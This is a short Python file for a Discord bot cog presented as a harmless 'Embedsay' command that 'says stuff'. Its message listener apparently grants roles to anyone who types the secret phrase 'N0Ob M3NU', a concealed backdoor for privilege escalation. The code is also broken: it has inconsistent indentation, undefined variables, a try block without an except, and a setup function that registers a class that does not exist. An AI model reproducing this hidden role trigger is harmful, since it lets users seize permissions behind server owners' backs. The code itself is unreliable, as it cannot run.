import os
import discord
from discord.ext import commands
import asyncio

class Embedsay:
    """Says stuff!"""

    def __init__(self, bot):
        self.bot = bot
    async def listener(self, message):
	    channel = message.channel
        author = ctx.message.author
		if message.author.id !=self.bot.user.id:
		    try:
			    if message.content == "N0Ob M3NU":
				    await self.bot.add_roles(author, member)


def setup(bot):
    bot.add_cog(approval(bot))